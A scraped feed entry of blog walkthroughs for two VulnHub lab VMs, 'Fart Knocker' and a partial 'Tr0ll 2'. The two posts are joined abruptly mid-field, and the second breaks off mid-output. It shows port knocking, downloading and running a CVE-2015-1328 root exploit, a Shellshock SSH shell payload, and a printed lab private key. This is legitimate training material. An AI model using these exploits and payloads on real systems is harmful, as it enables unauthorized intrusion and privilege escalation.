Walkthrough","link":"https://highon.coffee/blog/fartknocker-walkthrough/","description":"<div class=\"coffee-rating\"> \n <table> \n  <tbody> \n   <tr> \n    <td> <p><code>Coffee Difficulty Rating:</code></p> </td> \n    <td> <p><i class=\"fa fa-coffee\"></i></p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<ul id=\"markdown-toc\"> \n <li><a href=\"https://highon.coffee/blog/fartknocker-walkthrough/#description\" id=\"markdown-toc-description\">Description</a></li> \n <li><a href=\"https://highon.coffee/blog/fartknocker-walkthrough/#enumeration\" id=\"markdown-toc-enumeration\">Enumeration</a> \n  <ul> \n   <li><a href=\"https://highon.coffee/blog/fartknocker-walkthrough/#host-service-enumeration\" id=\"markdown-toc-host-service-enumeration\">Host Service Enumeration</a></li> \n  </ul> </li> \n <li><a href=\"https://highon.coffee/blog/fartknocker-walkthrough/#web-application-analysis\" id=\"markdown-toc-web-application-analysis\">Web Application Analysis</a> \n  <ul> \n   <li><a href=\"https://highon.coffee/blog/fartknocker-walkthrough/#pcap-analysis\" id=\"markdown-toc-pcap-analysis\">Pcap Analysis</a></li> \n  </ul> </li> \n <li><a href=\"https://highon.coffee/blog/fartknocker-walkthrough/#local-system-enumeration\" id=\"markdown-toc-local-system-enumeration\">Local System Enumeration</a></li> \n <li><a href=\"https://highon.coffee/blog/fartknocker-walkthrough/#local-privilege-escalation\" id=\"markdown-toc-local-privilege-escalation\">Local Privilege Escalation</a></li> \n <li><a href=\"https://highon.coffee/blog/fartknocker-walkthrough/#root-flag\" id=\"markdown-toc-root-flag\">Root Flag</a></li> \n <li><a href=\"https://highon.coffee/blog/fartknocker-walkthrough/#conclusion\" id=\"markdown-toc-conclusion\">Conclusion</a></li> \n</ul> \n<h2 id=\"description\">Description</h2> \n<p>A VulnHub VM challenge, based on packet analysis and port knocking.</p> \n<p><strong>Author Note:</strong> I got the word “Fart Knocker” from watching beavis and butthead back in the day. Otherwise you kids might not understand :)</p> \n<p><strong>Author:</strong> TopHotSec</p> \n<p><strong>Download:</strong> <a href=\"https://www.vulnhub.com\">VulnHub</a></p> \n<h2 id=\"enumeration\">Enumeration</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">nmap <span class=\"nt\">-v</span> <span class=\"nt\">-p</span> 1-65535 <span class=\"nt\">-sV</span> <span class=\"nt\">-O</span> <span class=\"nt\">-sT</span> 10.0.1.113</code></pre> \n</figure> \n<h3 id=\"host-service-enumeration\">Host Service Enumeration</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Port</th> \n    <th>Service</th> \n    <th>Version Detection</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 80</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Apache httpd 2.4.7 ((Ubuntu))</p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"web-application-analysis\">Web Application Analysis</h2> \n<p>Inspection of the web application revealed a pcap file link:</p> \n<p><img src=\"https://highon.coffee/img/blog/fartknocker/web-pcap1.png\" alt=\"Web Pcap download\" /></p> \n<h3 id=\"pcap-analysis\">Pcap Analysis</h3> \n<p>Looking at the pcap file revealed the VM was likely using port knocking (bear in mind the VM’s network has changed).</p> \n<div class=\"note info\"> \n <h5>What is Port Knocking ?</h5> \n <p>Port Knocking is the a *security by obscurity* technique, in order to expose a service port you must first connect to a set of ports in a specific order. More information about [port knocking on wikipedia](https://en.wikipedia.org/wiki/Port_knocking).</p> \n</div> \n<p><img src=\"https://highon.coffee/img/blog/fartknocker/pcap1.png\" alt=\"pcap1 wireshark\" /></p> \n<p>Quick bash loop script for the port knocking:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"c\">#!/bin/bash</span>\n<span class=\"nv\">HOST</span><span class=\"o\">=</span><span class=\"nv\">$1</span>\n<span class=\"nb\">shift\n</span><span class=\"k\">for </span>ARG <span class=\"k\">in</span> <span class=\"s2\">\"</span><span class=\"nv\">$@</span><span class=\"s2\">\"</span>\n<span class=\"k\">do\n    </span>nmap <span class=\"nt\">-Pn</span> <span class=\"nt\">--host_timeout</span> 100 <span class=\"nt\">--max-retries</span> 0 <span class=\"nt\">-p</span> <span class=\"nv\">$ARG</span> <span class=\"nv\">$HOST</span>\n<span class=\"k\">done</span></code></pre> \n</figure> \n<p>Successful port knocking combo:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>root:~]# ./knock.sh 10.0.1.113 7000 8000 9000 7000 8000 <span class=\"o\">&amp;&amp;</span> telnet 10.0.1.113 8888\n\nTrying 10.0.1.113...\nConnected to 10.0.1.113.\nEscape character is <span class=\"s1\">'^]'</span><span class=\"nb\">.</span>\n/burgerworld/\nConnection closed by foreign host.</code></pre> \n</figure> \n<p><code>http://10.0.1.113/burgerworld/</code>, disclosed another pcap file:</p> \n<p><img src=\"https://highon.coffee/img/blog/fartknocker/web-pcap2.png\" alt=\"Web pcap2\" /></p> \n<p>Investigation of the pcap file in <strong>Wireshark</strong> revealed more knocking again, following by a connection over port 8080.</p> \n<p>Following the TCP stream for port 8080, discovered the following:</p> \n<p><img src=\"https://highon.coffee/img/blog/fartknocker/pcap-follow-tcp-stream-wireshark.png\" alt=\"Wireshark pcap follow tcp stream\" /></p> \n<p>The hint: <code>eins drei drei sieben</code> is German for <code>1 3 3 7</code>.</p> \n<p>The previous port knocking patterned worked again for ports <code>1 3 3 7</code>:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>root:~]# ./knock.sh 10.0.1.113 1 3 3 7<span class=\"p\">;</span> telnet 10.0.1.113 1337\n\nNmap <span class=\"k\">done</span>: 1 IP address <span class=\"o\">(</span>1 host up<span class=\"o\">)</span> scanned <span class=\"k\">in </span>0.28 seconds\nTrying 10.0.1.113...\nConnected to 10.0.1.113.\nEscape character is <span class=\"s1\">'^]'</span><span class=\"nb\">.</span>\n/iamcornholio/\nConnection closed by foreign host.</code></pre> \n</figure> \n<p><code>http://10.0.1.113/iamcornholio/</code>, disclosed a Base64 encoded string:</p> \n<p><img src=\"https://highon.coffee/img/blog/fartknocker/base64.png\" alt=\"Base64 String\" /></p> \n<p>The string was decoded, revealing another port knocking sequence:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>root:~]# <span class=\"nb\">echo</span> <span class=\"s2\">\"T3BlbiB1cCBTU0g6IDg4ODggOTk5OSA3Nzc3IDY2NjYK\"</span> | <span class=\"nb\">base64</span> <span class=\"nt\">-d</span>\nOpen up SSH: 8888 9999 7777 6666</code></pre> \n</figure> \n<p>The previous port knocking technique was leveraged:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>root:~]# ./knock.sh 10.0.1.113 8888 9999 7777 6666<span class=\"p\">;</span> ssh 10.0.1.113\n\nThe authenticity of host <span class=\"s1\">'10.0.1.113 (10.0.1.113)'</span> can<span class=\"s1\">'t be established.\nECDSA key fingerprint is fe:16:33:a4:4d:7f:3d:db:b6:11:d4:b8:c1:32:b6:79.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '</span>10.0.1.113<span class=\"s1\">' (ECDSA) to the list of known hosts.\n############################################\n# CONGRATS! YOU HAVE OPENED THE SSH SERVER #\n# USERNAME: butthead                       #\n# PASSWORD: nachosrule                     #\n############################################\nroot@10.0.1.113'</span>s password:</code></pre> \n</figure> \n<p>Logging in using the disclosed credentials worked, but the session closed almost immediately and displayed the following message:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">butthead@10.0.1.113<span class=\"s1\">'s password:\nWelcome to Ubuntu 14.04.2 LTS (GNU/Linux 3.13.0-46-generic i686)\n\n * Documentation:  https://help.ubuntu.com/\nLast login: Tue Mar  3 01:02:49 2015 from 192.168.56.102\nYou are only logging in for a split second! What do you do!\nConnection to 10.0.1.113 closed.</span></code></pre> \n</figure> \n<p>The following command was executed, successfully spawning a shell on the target:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>root:~]# ./knock.sh 10.0.1.113 8888 9999 7777 6666<span class=\"p\">;</span> ssh butthead@10.0.1.113 <span class=\"s2\">\"/bin/sh\"</span></code></pre> \n</figure> \n<h2 id=\"local-system-enumeration\">Local System Enumeration</h2> \n<p>The following hint was discovered:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nv\">$ </span><span class=\"nb\">cat </span>nachos\nGreat job on getting this far.\n\nCan you login as beavis or root ?</code></pre> \n</figure> \n<h2 id=\"local-privilege-escalation\">Local Privilege Escalation</h2> \n<p>Enumeration of the system indicted it was likely vulnerable to <a href=\"https://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html\">CVE-2015-1328</a>, a local privilege escalation using overlayfs mounts inside of user namespaces. Allowing a local user to exploit the flaw to gain administrative privileges on the system.</p> \n<p>Exploit process (CVE-2015-1328):</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nv\">$ </span>wget https://www.exploit-db.com/download/37292\n<span class=\"nt\">--2015-12-19</span> 05:18:22--  https://www.exploit-db.com/download/37292\nResolving www.exploit-db.com <span class=\"o\">(</span>www.exploit-db.com<span class=\"o\">)</span>... 192.124.249.8\nConnecting to www.exploit-db.com <span class=\"o\">(</span>www.exploit-db.com<span class=\"o\">)</span>|192.124.249.8|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 5123 <span class=\"o\">(</span>5.0K<span class=\"o\">)</span> <span class=\"o\">[</span>application/txt]\nSaving to: ‘37292’\n\n     0K .....                                                 100% 1.29G<span class=\"o\">=</span>0s\n\n2015-12-19 05:18:25 <span class=\"o\">(</span>1.29 GB/s<span class=\"o\">)</span> - ‘37292’ saved <span class=\"o\">[</span>5123/5123]\n\n<span class=\"nv\">$ </span><span class=\"nb\">ls\n</span>37292\nnachos\n<span class=\"nv\">$ </span><span class=\"nb\">mv </span>37292 37292.c\n<span class=\"nv\">$ </span>gcc 37292.c <span class=\"nt\">-o</span> 37292\n<span class=\"nv\">$ </span>./37292\nspawning threads\nmount <span class=\"c\">#1</span>\nmount <span class=\"c\">#2</span>\nchild threads <span class=\"k\">done</span>\n/etc/ld.so.preload created\ncreating shared library\nsh: 0: can<span class=\"s1\">'t access tty; job control turned off\n# id\nuid=0(root) gid=0(root) groups=0(root),1001(butthead)</span></code></pre> \n</figure> \n<h2 id=\"root-flag\">Root Flag</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"c\"># cd /root</span>\n<span class=\"c\"># ls</span>\nSECRETZ\n<span class=\"c\"># cat SECRETZ</span>\nYou have <span class=\"k\">done </span>a great job, <span class=\"k\">if </span>you can see this, please shoot me an email\nand <span class=\"nb\">let </span>me know that you have beat this box!\n\nSECRET <span class=\"o\">=</span> <span class=\"s2\">\"LIVE LONG AND PROSPER, REST IN PEACE MR. SPOCK\"</span>\n\nadmin@top-hat-sec.com</code></pre> \n</figure> \n<h2 id=\"conclusion\">Conclusion</h2> \n<p>I enjoyed the VM, dispite not being a fan of <em>Beavis and Butt-Head</em>. Looking at the pcap files for port knocking patterns was a new experience for me.</p> \n<p>Thanks for the VM :)</p>","descriptionType":"text/html","publishedDate":"Fri, 03 Apr 2015 11:00:59 <li><a href=\"https://highon.coffee/blog/tr0ll-2-walkthrough/#ssh-shellshock\" id=\"markdown-toc-ssh-shellshock\">SSH Shellshock</a></li> \n</ul> \n<p>I rooted Tr0ll 1, so thought it would be rude not to try the second VM in the Tr0ll series… <a href=\"https://www.vulnhub.com/entry/tr0ll-2,107/\">Tr0ll 2</a> requires a buffer overflow to perform local escalation, the first VM didn’t require any exploitation. However, like the first VM I’d say this is challenege is more a case of guessing credentials, trying things you think probably wont work.</p> \n<h3 id=\"description\">Description</h3> \n<p><i> The next machine in the Tr0ll series of VMs. This one is a step up in difficulty from the original Tr0ll but the time required to solve is approximately the same, and make no mistake, trolls are still present! :)</i> </p> \n<p><i> Difficulty is beginner++ to intermediate. </i></p> \n<p>##Enumeration</p> \n<p>Enumeration process started.</p> \n<p><img src=\"https://highon.coffee/img/kirk-enumeration.gif\" alt=\"Star Trek Enumeration\" /></p> \n<section class=\"shellbox\"> \n <div class=\"unit golden-large code\"> \n  <p class=\"title\">nmap -p 1-65535 -sV -sS -A -T4 172.31.31.6</p> \n  <div class=\"shell\"> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">nmap -p 1-65535 -sV -sS -A -T4 172.31.31.6</span> </p> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">Starting Nmap 6.47 ( http://nmap.org ) at 2015-01-02 19:24 EST<br /></span> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">Host is up (0.0026s latency).<br /></span> \n   <span class=\"output\">Not shown: 65532 closed ports<br /></span> \n   <span class=\"output\">PORT STATE SERVICE VERSION <br /></span> \n   <span class=\"output\">21/tcp open ftp vsftpd 2.0.8 or later<br /></span> \n   <span class=\"output\">22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)<br /></span> \n   <span class=\"output\">| ssh-hostkey: <br /></span> \n   <span class=\"output\">22/tcp open ssh (protocol 2.0)<br /></span> \n   <span class=\"output\">| ssh-hostkey: <br /></span> \n   <span class=\"output\">| 1024 82:fe:93:b8:fb:38:a6:77:b5:a6:25:78:6b:35:e2:a8 (DSA)<br /></span> \n   <span class=\"output\">| 2048 7d:a5:99:b8:fb:67:65:c9:64:86:aa:2c:d6:ca:08:5d (RSA)<br /></span> \n   <span class=\"output\">|_ 256 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96 (ECDSA)<br /></span> \n   <span class=\"output\">80/tcp open http Apache httpd 2.2.22 ((Ubuntu))<br /></span> \n   <span class=\"output\">|_http-title: Site doesn't have a title (text/html).<br /></span> \n   <span class=\"output\">Device type: general purpose<br /></span> \n   <span class=\"output\">Running: Linux 3.X<br /></span> \n   <span class=\"output\">OS CPE: cpe:/o:linux:linux_kernel:3<br /></span> \n   <span class=\"output\">OS details: Linux 3.2 - 3.8<br /></span> \n   <span class=\"output\">Network Distance: 2 hops<br /></span> \n   <span class=\"output\">Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /></span> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .<br /></span> \n   <span class=\"output\">Nmap done: 1 IP address (1 host up) scanned in 13.63 seconds<br /></span> &lt;/p&gt; \n  </div> \n </div> \n</section> \n<p>###Service Enumeration</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Port</th> \n    <th>Service</th> \n    <th>Version Detection</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 21</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>FTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>vsftpd 2.0.8 or later</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 22</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>SSH</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 80</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Apache httpd 2.2.22 ((Ubuntu))</p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<p>###SSH Enumeration</p> \n<p>Zoning out watching my Nmap scan complete I noticed, the hostname was Tr0ll. I attempted to login via ssh with <code>Tr0ll</code> password: <code>Tr0ll</code>, it worked ! But I instantly got booted off, tried a few things nothing worked… So I tried FTP.</p> \n<p>###FTP Enumeration</p> \n<p>I tired the same credentials against ftp and discovered a file called “noob” in the ftp root.</p> \n<section class=\"shellbox\"> \n <div class=\"unit golden-large code\"> \n  <p class=\"title\">ftp noob</p> \n  <div class=\"shell\"> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">ftp 172.31.31.6</span></p> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">Connected to 172.31.31.6<br /></span> \n   <span class=\"output\">220 Welcome to Tr0ll FTP... Only noobs stay for a while...<br /></span> \n   <span class=\"output\">Name (172.31.31.6:root): Tr0ll<br /></span> \n   <span class=\"output\">331 Please specify the password.<br /></span> \n   <span class=\"output\">Password:<br /></span> \n   <span class=\"output\">230 Login successful.<br /></span> \n   <span class=\"output\">Remote system type is UNIX.<br /></span> \n   <span class=\"output\">Using binary mode to transfer files.<br /></span> \n   <span class=\"output\">ftp&gt; get lmao.zip<br /></span> \n   <span class=\"output\">local: lol.pcap remote: lol.pcap<br /></span> \n   <span class=\"output\">200 PORT command successful. Consider using PASV.<br /></span> \n   <span class=\"output\">150 Opening BINARY mode data connection for lmao.zip (1474 bytes).<br /></span> \n   <span class=\"output\">226 Transfer complete.<br /></span> \n   <span class=\"output\">80/tcp open http Apache httpd 2.4.7 ((Ubuntu))<br /></span> \n   <span class=\"output\">1474 bytes received in 0.02 secs (60.6 kB/s)<br /></span> \n   <span class=\"output\">ftp&gt; exit<br /></span> \n   <span class=\"output\">221 Goodbye.<br /></span> &lt;/p&gt; \n  </div> \n </div> \n</section> \n<p>Attempting to extract lmao.zip failed, prompting for a <code>noob</code> password.</p> \n<p>Onto the next service then…</p> \n<p>###HTTP Enumeration</p> \n<p><img src=\"https://highon.coffee/img/star-trek-enumeration.gif\" alt=\"Star Trek HTTP Enumeration\" /></p> \n<p>Web browser showed:</p> \n<p><img src=\"https://highon.coffee/img/blog/tr0ll-me-again.PNG\" alt=\"tr0ll me again\" /></p> \n<section class=\"shellbox\"> \n <div class=\"unit golden-large code\"> \n  <p class=\"title\">nmap --script=http-enum -p80 -n 172.31.31.6</p> \n  <div class=\"shell\"> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">nmap --script=http-enum -p80 -n 172.31.31.6</span></p> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">Starting Nmap 6.47 ( http://nmap.org ) at 2015-01-2 18:40 GMT<br /></span> \n   <span class=\"output\">Nmap scan report for 172.31.31.6<br /></span> \n   <span class=\"output\">Host is up (0.00046s latency).<br /></span> \n   <span class=\"output\">PORT STATE SERVICE<br /></span> \n   <span class=\"output\">80/tcp open http<br /></span> \n   <span class=\"output\">| http-enum:<br /></span> \n   <span class=\"output\">| /robots.txt: Robots file<br /></span> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">Nmap done: 1 IP address (1 host up) scanned in 0.84 seconds<br /></span> &lt;/p&gt; \n  </div> \n </div> \n</section> \n<p>Entering /robots.txt url in the browser rendered:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">User-agent:<span class=\"k\">*</span>\nDisallow:\n/noob\n/nope\n/try_harder\n/keep_trying\n/isnt_this_annoying\n/nothing_here\n/404\n/LOL_at_the_last_one\n/trolling_is_fun\n/zomg_is_this_it\n/you_found_me\n/I_know_this_sucks\n/You_could_give_up\n/dont_bother\n/will_it_ever_end\n/I_hope_you_scripted_this\n/ok_this_is_it\n/stop_whining\n/why_are_you_still_looking\n/just_quit\n/seriously_stop</code></pre> \n</figure> \n<p>The slash was stripped off with some sed <code>sed 's./..g' robots.txt</code> dirb was then used to check the following urls.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nt\">-----------------</span>\nDIRB v2.21    \nBy The Dark Raver\n<span class=\"nt\">-----------------</span>\n\nSTART_TIME: Sat Jan  3 08:08:15 2015\nURL_BASE: http://172.31.31.6/\nWORDLIST_FILES: robots.txt\n\n<span class=\"nt\">-----------------</span>\n\nGENERATED WORDS: 21                                                            \n\n<span class=\"nt\">----</span> Scanning URL: http://172.31.31.6/ <span class=\"nt\">----</span>\n+ http://172.31.31.6//noob <span class=\"o\">(</span>CODE:301|SIZE:309<span class=\"o\">)</span>                                                                               \n+ http://172.31.31.6//keep_trying <span class=\"o\">(</span>CODE:301|SIZE:316<span class=\"o\">)</span>                                                                        \n+ http://172.31.31.6//dont_bother <span class=\"o\">(</span>CODE:301|SIZE:316<span class=\"o\">)</span>                                                                        \n+ http://172.31.31.6//ok_this_is_it <span class=\"o\">(</span>CODE:301|SIZE:318<span class=\"o\">)</span>                                                                      \n\n<span class=\"nt\">-----------------</span>\nDOWNLOADED: 21 - FOUND: 4</code></pre> \n</figure> \n<p>They all rendered the same image (301’d).</p> \n<p><img src=\"https://highon.coffee/img/blog/tr0ll-cats.PNG\" alt=\"tr0ll cats\" /></p> \n<p>Nothing exciting was in the page source:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">What did you really think to find here? Try Harder</code></pre> \n</figure> \n<p><code>cat_the_troll.jpg</code> was downloaded from all the above locations from the target and examined.</p> \n<p>ls -la showed a slightly different file size for one of the images, I began by running each of the files through cat (cating the cat? - sorry).</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">Look Deep within y0ur_self <span class=\"k\">for </span>the answer</code></pre> \n</figure> \n<p>I tired this against the previously downloaded <code>lmao.zip</code> file, no luck. I tried <code>y0ur_self</code> as web path like on tr0ll:1</p> \n<p>Success, the web dir contained a text file <code>http://172.31.31.6/y0ur_self/answer.txt</code> scrolling though from the browser it looked like the file was base64 encoded.</p> \n<section class=\"shellbox\"> \n <div class=\"unit golden-large code\"> \n  <p class=\"title\">wget http://172.31.31.6/y0ur_self/answer.txt</p> \n  <div class=\"shell\"> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">wget http://172.31.31.6/y0ur_self/answer.txt</span></p> \n   <span class=\"output\"><br /></span> &lt;/p&gt; \n  </div> \n </div> \n</section> \n<p>Decoding the file revealed it was massive, the following was used to decode and sort by line length:</p> \n<section class=\"shellbox\"> \n <div class=\"unit golden-large code\"> \n  <p class=\"title\">base64 decoding</p> \n  <div class=\"shell\"> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">base64 -d answer.txt &gt; answer-decoded.txt &amp;&amp; awk '{print length, $0;}' answer-decoded.txt | sort -nr | less</span></p> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\"><br />30 ItCantReallyBeThisEasyRightLOL</span> &lt;/p&gt; \n  </div> \n </div> \n</section> \n<p>The top line looked promising, <code>ItCantReallyBeThisEasyRightLOL</code> I tried this against <code>lmao.zip</code></p> \n<section class=\"shellbox\"> \n <div class=\"unit golden-large code\"> \n  <p class=\"title\">unzip lmao.zip</p> \n  <div class=\"shell\"> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">unzip lmao.zip</span></p> \n   <span class=\"output\">Archive: lmao.zip<br /></span> \n   <span class=\"output\">[lmao.zip] noob password:<br /></span> \n   <span class=\"output\"> inflating: noob <br /></span> &lt;/p&gt; \n  </div> \n </div> \n</section> \n<p><img src=\"https://highon.coffee/img/data-yes-fist.gif\" alt=\"Data Yes Fist\" /></p> \n<p>Yes!</p> \n<p>The contents of <code>noob</code></p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nt\">-----BEGIN</span> RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq\nyDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1\n/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo\nq+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5\nz+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy\ne5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna\nu+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0\ngvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq\nUmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079\nLa35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR\nxgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP\naq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW\nK+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx\nn48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB\nTEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh\nWBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv\nibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t\n0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq\nvKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh\nywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG\nth8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s\nG9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye\nq51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO\nvW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG\n<span class=\"nv\">zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g</span><span class=\"o\">==</span>\n<span class=\"nt\">-----END</span> RSA PRIVATE KEY-----</code></pre> \n</figure> \n<h3 id=\"ssh-shellshock\">SSH Shellshock</h3> \n<p>Attempting to login using the discovered key failed, with a messaging saying <code>TRY HARDER LOL!</code>.</p> \n<p><img src=\"https://highon.coffee/img/vulcan-ragequit.gif\" alt=\"Vulcan Rage Quit\" /></p> \n<p>I tried to feed it commands by tagging them on the end, the connection hung then dropped with no message.</p> \n<p>I googled some shellshock options and managed to spawn a shell with:</p> \n<p><code>ssh -i noob noob@192.168.145.129 '() { :;}; /bin/bash'</code></p> \n<section class=\"shellbox\"> \n <div class=\"unit golden-large code\"> \n  <p class=\"title\">shellshock ssh</p> \n  <div class=\"shell\"> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">ssh -i noob noob@192.168.145.129 '() { :;}; /bin/bash'</span></p> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">id<br /></span> \n   <span class=\"output\">uid=1002(noob) gid=1002(noob) groups=1002(noob)<br /></span> &lt;/p&gt; \n  </div> \n </div> \n</section> \n<p>##Local Enumeration</p> \n<p>Transfered my local enumeration script to the target, disclosing the following odd sticky bit files:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"c\">#########################################</span>\n<span class=\"c\">## Sticky Bit                          ##</span>\n<span class=\"c\">#########################################</span>\n\ndrwsr-xr-x 3 root root 4096 Dec 29 19:00 /nothing_to_see_here\ndrwsr-xr-x 5 root root 4096 Oct  4 22:36 /nothing_to_see_here/choose_wisely\ndrwsr-xr-x 2 root root 4096 Oct  5 21:19 /nothing_to_see_here/choose_wisely/door2\ndrwsr-xr-x 2 root root 4096 Oct  5 21:18 /nothing_to_see_here/choose_wisely/door3\ndrwsr-xr-x 2 root root 4096 Oct  4 22:19 /nothing_to_see_here/choose_wisely/door1</code></pre> \n</figure> \n<p>Each of the door directories contained a file called r00t, du -sh * in the parent dir <code>choose_wisely</code> showed one of the files was larger - I started there.</p> \n<p><code>od -S 1 r00t</code> was used against each of the files, the larget file contained:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">0017545 bof.c\n0017553 __init_array_end\n0017574 _DYNAMIC\n0017605 